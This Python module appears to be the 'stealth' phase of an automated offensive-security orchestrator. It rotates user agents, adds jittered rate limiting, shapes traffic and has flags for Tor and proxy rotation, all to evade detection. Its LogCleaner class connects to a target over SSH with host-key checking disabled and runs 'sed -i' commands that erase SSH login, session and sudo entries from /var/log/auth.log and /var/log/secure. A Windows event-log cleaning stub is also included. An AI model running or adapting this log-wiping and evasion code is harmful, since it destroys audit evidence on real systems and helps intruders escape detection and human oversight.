import asyncio
import logging
import random
import time
from dataclasses import dataclass, field
from typing import Optional

from orchestrator.brain.phases.models import Finding, PhaseResult, Severity

logger = logging.getLogger("phase_stealth")

DEFAULT_RATE = 1.0
DEFAULT_JITTER = 0.5
DEFAULT_BURST = 3
DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
]


@dataclass
class StealthProfile:
    requests_per_sec: float = DEFAULT_RATE
    jitter: float = DEFAULT_JITTER
    burst_size: int = DEFAULT_BURST
    user_agents: list[str] = field(default_factory=lambda: DEFAULT_USER_AGENTS.copy())
    use_tor: bool = False
    rotate_proxies: bool = False
    min_delay: float = 0.5
    max_delay: float = 3.0
    packet_padding: int = 0


class RateLimiter:
    def __init__(self, rate: float = DEFAULT_RATE, jitter: float = DEFAULT_JITTER):
        self.rate = rate
        self.jitter = jitter
        self._last_call = 0.0
        self._tokens = 0.0
        self._last_refill = time.monotonic()

    async def acquire(self):
        now = time.monotonic()
        elapsed = now - self._last_refill
        self._tokens = min(self.rate, self._tokens + elapsed * self.rate)
        self._last_refill = now
        if self._tokens < 1.0:
            wait = (1.0 - self._tokens) / max(self.rate, 0.01)
            jit = random.uniform(-self.jitter, self.jitter)
            wait = max(0.0, wait + jit)
            await asyncio.sleep(wait)
            self._tokens = 0.0
            self._last_refill = time.monotonic()
        else:
            self._tokens -= 1.0
            self._last_refill = time.monotonic()

    def reset(self):
        self._last_call = 0.0
        self._tokens = 0.0
        self._last_refill = time.monotonic()

    def __repr__(self):
        return f"RateLimiter(rate={self.rate}, jitter={self.jitter})"


class TrafficShaper:
    def __init__(self, profile: Optional[StealthProfile] = None):
        self.profile = profile or StealthProfile()

    def delay(self) -> float:
        return random.uniform(self.profile.min_delay, self.profile.max_delay)

    def jittered_user_agent(self) -> str:
        return random.choice(self.profile.user_agents)

    def random_delay_jitter(self) -> float:
        base = self.delay()
        jit = random.uniform(-self.profile.jitter, self.profile.jitter)
        return max(0.1, base + jit)

    def pad_payload(self, data: bytes) -> bytes:
        if self.profile.packet_padding <= 0:
            return data
        pad_len = random.randint(0, self.profile.packet_padding)
        return data + b"\x00" * pad_len


class LogCleaner:
    SSH_LOG_PATTERNS = [
        "Accepted publickey for",
        "Accepted password for",
        "session opened for user",
        "sudo:",
        "Connection closed by",
    ]

    @staticmethod
    async def clean_ssh_logs(host: str, username: str, password: str, ssh_port: int = 22) -> bool:
        try:
            import asyncssh
            cmds = []
            for logfile in ["/var/log/auth.log", "/var/log/secure"]:
                for pattern in LogCleaner.SSH_LOG_PATTERNS:
                    sed = f"sed -i '/{pattern}.*{username}/d' {logfile} 2>/dev/null"
                    cmds.append(sed)
                cmds.append(f"sed -i '/sshd.*{username}/d' {logfile} 2>/dev/null")
            async with asyncssh.connect(host, port=ssh_port, username=username, password=password,
                                        known_hosts=None) as conn:
                for cmd in cmds[:6]:
                    try:
                        await conn.run(cmd, check=False)
                    except Exception:
                        logger.debug("Non-critical error", exc_info=True)
            return True
        except ImportError:
            logger.warning("asyncssh not available for log cleaning")
            return False
        except Exception as e:
            logger.warning(f"Log cleaning failed: {e}")
            return False

    @staticmethod
    async def clean_windows_events(host: str, username: str, password: str) -> bool:
        try:
            import impacket
            from impacket.dcerpc.v5 import transport, scmr
            logger.warning("Windows event log cleaning requires impacket DCE/RPC")
            return False
        except ImportError:
            return False
        except Exception as e:
            logger.warning(f"Windows event log cleaning failed: {e}")
            return False


_active_profile: Optional[StealthProfile] = None
_active_limiter: Optional[RateLimiter] = None
_active_shaper: Optional[TrafficShaper] = None


def get_active_limiter() -> Optional[RateLimiter]:
    return _active_limiter


def get_active_shaper() -> Optional[TrafficShaper]:
    return _active_shaper


def get_active_profile() -> Optional[StealthProfile]:
    return _active_profile


async def run_stealth(target: str, findings: list[Finding] = None) -> PhaseResult:
    global _active_profile, _active_limiter, _active_shaper
    t0 = time.time()
    all_findings = list(findings or [])
    errors = []

    profile = StealthProfile()
    rate_limiter = RateLimiter(profile.requests_per_sec, profile.jitter)
    traffic_shaper = TrafficShaper(profile)

    _active_profile = profile
    _active_limiter = rate_limiter
    _active_shaper = traffic_shaper

    rate_limiter.reset()
    all_findings.append(Finding(
        phase="stealth", type="rate_limiter_active", target=target,
        severity=Severity.INFO,
        description=f"Rate limiter initialized: {profile.requests_per_sec} req/s ±{profile.jitter}s",
        evidence=str(rate_limiter),
    ))

    ua_list = ", ".join(profile.user_agents[:3])
    all_findings.append(Finding(
        phase="stealth", type="user_agent_rotation", target=target,
        severity=Severity.INFO,
        description=f"User-agent rotation enabled ({len(profile.user_agents)} agents)",
        evidence=ua_list,
    ))

    all_findings.append(Finding(
        phase="stealth", type="traffic_shaping", target=target,
        severity=Severity.INFO,
        description=f"Traffic shaping: delay [{profile.min_delay}-{profile.max_delay}]s, jitter ±{profile.jitter}s",
        evidence=f"padding: {profile.packet_padding} bytes | burst: {profile.burst_size}",
    ))

    acquire_t0 = time.monotonic()
    acquires = 3
    for _ in range(acquires):
        await rate_limiter.acquire()
    acquire_time = time.monotonic() - acquire_t0
    expected_min = acquires / profile.requests_per_sec

    all_findings.append(Finding(
        phase="stealth", type="rate_limiter_verified", target=target,
        severity=Severity.INFO,
        description=f"Rate limiter verified: {acquires} acquires took {acquire_time:.2f}s (expected >= {expected_min:.1f}s)",
        evidence=f"rate={profile.requests_per_sec} jitter={profile.jitter} actual={acquire_time:.2f}s",
    ))

    ua_test = traffic_shaper.jittered_user_agent()
    all_findings.append(Finding(
        phase="stealth", type="user_agent_example", target=target,
        severity=Severity.INFO,
        description=f"Sample user-agent: {ua_test[:60]}...",
        evidence=ua_test,
    ))

    delay_test = traffic_shaper.random_delay_jitter()
    all_findings.append(Finding(
        phase="stealth", type="delay_sampled", target=target,
        severity=Severity.INFO,
        description=f"Sample shaped delay: {delay_test:.2f}s",
    ))

    if profile.use_tor:
        all_findings.append(Finding(
            phase="stealth", type="tor_enabled", target=target,
            severity=Severity.INFO,
            description="Tor proxy enabled for anonymization",
        ))

    if profile.rotate_proxies:
        all_findings.append(Finding(
            phase="stealth", type="proxy_rotation", target=target,
            severity=Severity.INFO,
            description="Proxy rotation enabled",
        ))

    latency = time.time() - t0
    return PhaseResult(
        phase="stealth",
        success=True,
        findings=all_findings,
        summary=(
            f"Stealth profile applied: rate={profile.requests_per_sec}, "
            f"agents={len(profile.user_agents)}, "
            f"acquire_time={acquire_time:.2f}s for {acquires} tokens"
        ),
        latency=latency,
        error="; ".join(errors) if errors else None,
    )